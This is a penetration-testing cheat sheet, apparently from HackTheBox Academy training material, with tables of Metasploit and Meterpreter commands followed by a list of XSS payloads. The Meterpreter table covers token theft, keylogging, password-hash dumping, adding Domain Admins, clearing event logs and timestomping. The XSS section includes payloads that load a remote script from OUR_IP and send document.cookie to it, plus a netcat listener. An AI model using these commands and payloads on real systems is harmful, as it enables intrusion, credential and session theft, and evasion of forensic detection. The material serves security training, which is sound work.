|`exploit -j`|Run the exploit under the context of the job. (This will run the exploit in the background.)|
|`exploit -z`|Do not interact with the session after successful exploitation.|
|`exploit -e <encoder>`|Specify the payload encoder to use (example: exploit –e shikata_ga_nai).|
|`exploit -h`|Display help for the exploit command.|
|`sessions -l`|List available sessions (used when handling multiple shells).|
|`sessions -l -v`|List all available sessions and show verbose fields, such as which vulnerability was used when exploiting the system.|
|`sessions -s <script>`|Run a specific Meterpreter script on all Meterpreter live sessions.|
|`sessions -K`|Kill all live sessions.|
|`sessions -c <cmd>`|Execute a command on all live Meterpreter sessions.|
|`sessions -u <sessionID>`|Upgrade a normal Win32 shell to a Meterpreter console.|
|`db_create <name>`|Create a database to use with database-driven attacks (example: db_create autopwn).|
|`db_connect <name>`|Create and connect to a database for driven attacks (example: db_connect autopwn).|
|`db_nmap`|Use Nmap and place results in a database. (Normal Nmap syntax is supported, such as –sT –v –P0.)|
|`db_destroy`|Delete the current database.|
|`db_destroy <user:password@host:port/database>`|Delete database using advanced options.|
|||

---

###  Meterpreter Commands

|**Command**|**Description**|
|:--|:--|
|`help`|Open Meterpreter usage help.|
|`run <scriptname>`|Run Meterpreter-based scripts; for a full list check the scripts/meterpreter directory.|
|`sysinfo`|Show the system information on the compromised target.|
|`ls`|List the files and folders on the target.|
|`use priv`|Load the privilege extension for extended Meterpreter libraries.|
|`ps`|Show all running processes and which accounts are associated with each process.|
|`migrate <proc. id>`|Migrate to the specific process ID (PID is the target process ID gained from the ps command).|
|`use incognito`|Load incognito functions. (Used for token stealing and impersonation on a target machine.)|
|`list_tokens -u`|List available tokens on the target by user.|
|`list_tokens -g`|List available tokens on the target by group.|
|`impersonate_token <DOMAIN_NAMEUSERNAME>`|Impersonate a token available on the target.|
|`steal_token <proc. id>`|Steal the tokens available for a given process and impersonate that token.|
|`drop_token`|Stop impersonating the current token.|
|`getsystem`|Attempt to elevate permissions to SYSTEM-level access through multiple attack vectors.|
|`shell`|Drop into an interactive shell with all available tokens.|
|`execute -f <cmd.exe> -i`|Execute cmd.exe and interact with it.|
|`execute -f <cmd.exe> -i -t`|Execute cmd.exe with all available tokens.|
|`execute -f <cmd.exe> -i -H -t`|Execute cmd.exe with all available tokens and make it a hidden process.|
|`rev2self`|Revert back to the original user you used to compromise the target.|
|`reg <command>`|Interact, create, delete, query, set, and much more in the target’s registry.|
|`setdesktop <number>`|Switch to a different screen based on who is logged in.|
|`screenshot`|Take a screenshot of the target’s screen.|
|`upload <filename>`|Upload a file to the target.|
|`download <filename>`|Download a file from the target.|
|`keyscan_start`|Start sniffing keystrokes on the remote target.|
|`keyscan_dump`|Dump the remote keys captured on the target.|
|`keyscan_stop`|Stop sniffing keystrokes on the remote target.|
|`getprivs`|Get as many privileges as possible on the target.|
|`uictl enable <keyboard/mouse>`|Take control of the keyboard and/or mouse.|
|`background`|Run your current Meterpreter shell in the background.|
|`hashdump`|Dump all hashes on the target. use sniffer Load the sniffer module.|
|`sniffer_interfaces`|List the available interfaces on the target.|
|`sniffer_dump <interfaceID> pcapname`|Start sniffing on the remote target.|
|`sniffer_start <interfaceID> packet-buffer`|Start sniffing with a specific range for a packet buffer.|
|`sniffer_stats <interfaceID>`|Grab statistical information from the interface you are sniffing.|
|`sniffer_stop <interfaceID>`|Stop the sniffer.|
|`add_user <username> <password> -h <ip>`|Add a user on the remote target.|
|`add_group_user <"Domain Admins"> <username> -h <ip>`|Add a username to the Domain Administrators group on the remote target.|
|`clearev`|Clear the event log on the target machine.|
|`timestomp`|Change file attributes, such as creation date (antiforensics measure).|
|`reboot`|Reboot the target machine.|
|||


## XSS

| Code                                                                                          | Description                       |
| --------------------------------------------------------------------------------------------- | --------------------------------- |
| **XSS Payloads**                                                                              |                                   |
| `<script>alert(window.origin)</script>`                                                       | Basic XSS Payload                 |
| `<plaintext>`                                                                                 | Basic XSS Payload                 |
| `<script>print()</script>`                                                                    | Basic XSS Payload                 |
| `<img src="" onerror=alert(window.origin)>`                                                   | HTML-based XSS Payload            |
| `<script>document.body.style.background = "#141d2b"</script>`                                 | Change Background Color           |
| `<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>` | Change Background Image           |
| `<script>document.title = 'HackTheBox Academy'</script>`                                      | Change Website Title              |
| `<script>document.getElementsByTagName('body')[0].innerHTML = 'text'</script>`                | Overwrite website's main body     |
| `<script>document.getElementById('urlform').remove();</script>`                               | Remove certain HTML element       |
| `<script src="http://OUR_IP/script.js"></script>`                                             | Load remote script                |
| `<script>new Image().src='http://OUR_IP/index.php?c='+document.cookie</script>`               | Send Cookie details to us         |
| **Commands**                                                                                  |                                   |
| `python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"`                           | Run `xsstrike` on a url parameter |
| `sudo nc -lvnp 80`                                                                            | Start `netcat` listener           |
| `sudo php -S 0.0.0.0:80`                                                                      | Start `PHP` server                |